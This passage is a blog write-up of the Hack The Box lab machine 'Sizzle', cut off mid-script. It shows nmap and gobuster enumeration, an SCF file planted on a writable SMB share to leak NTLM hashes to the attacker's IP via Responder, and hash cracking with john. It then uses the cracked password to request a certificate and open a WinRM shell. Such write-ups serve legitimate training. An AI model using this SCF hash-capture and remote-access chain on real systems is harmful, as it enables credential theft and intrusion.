<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-01T15:21:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-sizzle-retired-and-heres-my-write-up-about-it-sizzle-was-a-great-machine-everything-about-it-was-great-it-was-very-realistic-fun-and-of-course-challenging-as-it-was-rated-insane-personally-one-of-my-favorites-and-one-of-the-best-active-directory-boxes-i-have-ever-solved-it-starts-by-getting-write-access-to-a-directory-in-an-smb-share-a-simple-scf-file-attack-with-responder-and-john-could-give-me-a-password-for-a-user-with-that-password-i-could-generate-a-certificate-request-and-get-a-certificate-then-a-winrm-session-after-that-comes-the-most-challenging-part-about-the-box-which-is-bypassing-antivirus-kerberoasting-and-privilege-escalation-but-before-doing-that-we-will-take-a-look-at-an-unintended-way-first-that-was-the-box-in-a-nutshell-its-a-windows-box-and-its-ip-is-101010103-i-added-it-to-etchosts-as-sizzlehtb-lets-jump-right-in-&quot;&gt;Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share, a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack with &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; could give me a password for a user. With that password I could generate a certificate request and get a certificate then a &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.103&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.15s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer
SF:sionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03&quot;);
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5s, deviation: 0s, median: -6s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-05-31 19:44:44
|_  start_date: 2019-05-31 12:06:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 19:45:27 2019 -- 1 IP address (1 host up) scanned in 232.62 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-lot-of-ports-we-got-ftp-on-port-21-dns-on-port-53-http-on-port-80-smb-and-ldap-we-also-see-that-the-domain-is-htblocal-and-commonname-is-sizzlehtblocal-so-i-added-it-to-etchosts-&quot;&gt;We got a lot of ports, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt;. We also see that the domain is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTB.LOCAL&lt;/code&gt; and commonName is &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb.local&lt;/code&gt;, so I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anonymous-authentication-on-ftp-was-allowed-but-there-was-nothing-there-so-i-will-skip-that&quot;&gt;anonymous authentication on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; was allowed but there was nothing there so I will skip that.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-that-http-server-and-the-index-only-had-this-gif-&quot;&gt;I checked that &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server and the index only had this &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-ran-gobuster-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://sizzle.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/31 19:51:59 Starting gobuster
=====================================================
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
=====================================================
2019/05/31 19:53:24 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;certenroll-sounds-interesting-but-unfortunately-its-a-403-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/certenroll&lt;/code&gt; sounds interesting, but unfortunately it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-time-to-check-smb-&quot;&gt;It’s time to check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; .&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb-scf-file-attack-amandas-credentials&quot;&gt;SMB, SCF File Attack, amanda’s Credentials&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-we-need-to-know-is-the-shares-we-can-use-smbclient-to-list-the-shares-&quot;&gt;First thing we need to know is the shares, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient --list //sizzle.htb/ -U &quot;&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-noticed-that-there-was-a-share-for-active-directory-certificate-services-most-likely-certsrv-will-be-on-the-web-server-&quot;&gt;I noticed that there was a share for Active Directory Certificate Services. Most likely &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt; will be on the web server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sizzle.htb/certsrv&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;yes-it-was-there-and-we-need-credentials-back-to-smb-the-only-share-i-could-access-anonymously-was-department-shares-&quot;&gt;Yes it was there, and we need credentials. Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; the only share I could access anonymously was &lt;code class=&quot;highlighter-rouge&quot;&gt;Department Shares&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-a-lot-of-directories-i-could-write-to-2-of-them---zz_archive-and-userspublic&quot;&gt;It had a lot of directories, I could write to 2 of them :  &lt;code class=&quot;highlighter-rouge&quot;&gt;ZZ_ARCHIVE&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-looking-for-credentials-since-we-can-write-to-one-of-the-directories-then-we-can-possibly-apply-an-scf-file-attack-you-can-read-about-it-here-we-are-going-to-put-an-scf-file-in-userspublic-it-looks-like-this-&quot;&gt;We are looking for credentials. Since we can write to one of the directories then we can possibly apply an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack. You can read about it &lt;a href=&quot;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&quot;&gt;here&lt;/a&gt;. We are going to put an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file in &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;. It looks like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Shell]
Command=2
IconFile=\\10.10.xx.xx\share\rick.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-run-responder-whenever-a-user-browses-that-directory-he-will-automatically-try-to-connect-to-my-box-through-smb-thats-when-responder-catches-the-hashes-more-info-in-the-link-above&quot;&gt;Then we will run &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt;. Whenever a user browses that directory he will automatically try to connect to my box through &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, that’s when &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; catches the hashes. More info in the link above.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;reponder -I tun0&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;responder-caught-hash-for-a-user-called-amanda-lets-crack-it-with-john-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; caught hash for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;. Let’s crack it with &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-ashare1972&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;requesting-a-certificate-winrm-session-as-amanda&quot;&gt;Requesting a Certificate, WinRm Session as amanda&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-access-certenroll-as-amanda-and-it-worked-fine-&quot;&gt;I tried to access &lt;code class=&quot;highlighter-rouge&quot;&gt;certenroll&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt; and it worked fine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-went-to-certsrv--and-used-amandas-credentials-to-authenticate&quot;&gt;So I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt;  and used &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials to authenticate&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-its-time-to-get-a-certificate-but-wait-a-second-whats-the-certificate-for-anyway-&quot;&gt;Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ?&lt;/h4&gt;
&lt;h4 id=&quot;a-full-nmap-scan-shows-that-winrm-ports-are-open-&quot;&gt;A full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ports are open :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -T5 -vvv --max-retries 1 sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:22:10 2019 as: nmap -p- -T5 -vvv -o nmapfull --max-retries 1 sizzle.htb
Warning: 10.10.10.103 giving up on port because retransmission cap hit (1).
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up, received echo-reply ttl 127 (0.11s latency).
Scanned at 2019-05-31 20:22:10 EET for 220s
Not shown: 65506 filtered ports
Reason: 65506 no-responses
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
54195/tcp open  unknown          syn-ack ttl 127
54204/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri May 31 20:25:50 2019 -- 1 IP address (1 host up) scanned in 220.02 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 5985,5986 -sV -sT -sC sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--2&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:27:46 2019 as: nmap -p 5985,5986 -sV -sT -sC -o nmapwinrm sizzle.htb
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.11s latency).

PORT     STATE SERVICE  VERSION
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-05-31T17:56:26
|_Not valid after:  2020-05-30T17:56:26
|_ssl-date: 2019-05-31T18:28:30+00:00; -6s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6s, deviation: 0s, median: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 20:28:43 2019 -- 1 IP address (1 host up) scanned in 57.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;port-5985-uses-http-while-5986-uses-https-when-i-got-amandas-credentials-i-tried-to-connect-to-port-5985-and-i-couldnt-so-we-will-do-it-through-port-5986-thats-why-we-need-a-certificate-if-you-dont-know-how-to-connect-through-winrm-well-get-to-that-later&quot;&gt;Port 5985 uses &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; while &lt;code class=&quot;highlighter-rouge&quot;&gt;5986&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. When I got &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, we’ll get to that later.)&lt;/h4&gt;
&lt;h4 id=&quot;we-will-generate-a-certificate-request-and-a-private-key-&quot;&gt;We will generate a certificate request and a private key :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-submit-an-advanced-certificate-request-paste-our-request-and-download-the-certificate-base64-encoded&quot;&gt;Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/22.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-use-winrm-but-whats-winrm-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, but what’s &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ?&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;Windows Remote Management (WinRM) is the Microsoft implementation of &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol&quot;&gt;WS-Management Protocol&lt;/a&gt;, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.
The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary&quot;&gt;&lt;em&gt;Intelligent Platform Management Interface (IPMI)&lt;/em&gt;&lt;/a&gt;, along with the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=84396&quot;&gt;Event Collector&lt;/a&gt; are components of the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=45204&quot;&gt;Windows Hardware Management&lt;/a&gt; features. -&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/portal&quot;&gt;Microsoft&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;winrm-is-not-meant-to-be-used-from-linux-but-luckily-theres-a-ruby-library-for-it-thats-how-we-will-connect&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; is not meant to be used from Linux but luckily there’s a &lt;a href=&quot;https://github.com/WinRb/WinRM&quot;&gt;Ruby library&lt;/a&gt; for it. That’s how we will connect.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-alamots-shell-and-added-some-stuff-for-the-cert-and-the-key-&quot;&gt;I used &lt;a href=&quot;https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb&quot;&gt;Alamot’s shell&lt;/a&gt; and added some stuff for the cert and the key :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://10.10.10.103:5986/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;client_cert: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/certnew.cer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;client_key: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/request.key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

